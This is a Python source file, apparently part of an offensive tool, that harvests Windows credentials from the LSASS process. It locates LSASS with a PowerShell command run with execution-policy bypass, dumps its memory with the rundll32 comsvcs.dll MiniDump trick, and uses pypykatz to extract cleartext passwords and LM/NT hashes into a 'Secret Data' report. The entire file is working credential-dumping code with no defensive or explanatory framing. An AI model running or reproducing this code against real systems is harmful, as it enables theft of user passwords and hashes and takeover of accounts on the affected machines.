import subprocess
import os
import json
from pypykatz.pypykatz import pypykatz

class lsass:
    def get_lsass_proc_id(self):
        get_proc_id_command="powershell -exec bypass -c \"Get-Process lsass | format-list ID |  Out-String\""
        p = subprocess.Popen(args=get_proc_id_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True)
        stdout=str(p.communicate()[0],encoding="utf-8").replace("\\r\\n","")
        proc_id=stdout.split(":")[1].split(" ")[1].strip()
        return proc_id

    def dump_lssas(self,proc_id):
        dump_file_path="./output/lsass.dmp"
        dump_lssas_command="powershell -exec bypass -c \"rundll32 C:\\windows\\System32\\comsvcs.dll MiniDump {proc_id} {dump_filename} full\"".format(proc_id=proc_id, dump_filename=dump_file_path)
        p = subprocess.Popen(args=dump_lssas_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True)
        p.communicate()
        return dump_file_path

    def get_login_data(self,json_data):
        '''
        with open(res_file_path, 'r') as json_file:
            json_data=json.load(json_file)
        '''
        json_data=json.loads(json_data)
        login_sessions={}
        for key in json_data:
            login_sessions=json_data['logon_sessions']
        results={}
        for session_id in login_sessions:
            login_session=login_sessions[session_id]
            for i in ['credman_creds', 'ssp_creds', 'livessp_creds', 'tspkg_creds', 'wdigest_creds']:
                for data in login_session.get(i,[]):
                    if all((data['username'], data['password'])):
                        login=data['username']
                        if login not in results:
                            results[login]={}
                        results[login]['Type'] = i
                        results[login]['Domain'] = data.get('domainname', 'N/A')
                        results[login]['Password'] = data['password']
            for data in login_session.get('msv_creds', []):
                if data['username']:
                    login = data['username']
                else:
                    login = login_session['username']

                if login not in results:
                    results[login] = {}
                if data['domainname']:
                    results[login]['domainname'] = data['domainname']
                if data['SHAHash']:
                    results[login]['Shahash'] = data['SHAHash']
                if data['LMHash']:
                    results[login]['Lmhash'] = data['LMHash']
                if data['NThash']:
                    results[login]['Nthash'] = data['NThash']
        return results

    def get_result(self, target_name, login_data):
        desc=target_name+" Secret Data"
        result={}
        result['desc']=desc
        data=[]
        for key in login_data:
            data_item={}
            data_item['username']=key
            for skey in login_data[key]:
                data_item[skey]=login_data[key][skey]
            data.append(data_item)
        result['data']=data
        return result

    def run(self, target_list):
        result=[]
        if 'lsass' in target_list:
            mimi = pypykatz.go_live()
            logon_sessions = mimi.to_json()
            login_data=self.get_login_data(logon_sessions)
            lsass_result=self.get_result('Lsass',login_data)
            result.append(lsass_result)
        return result
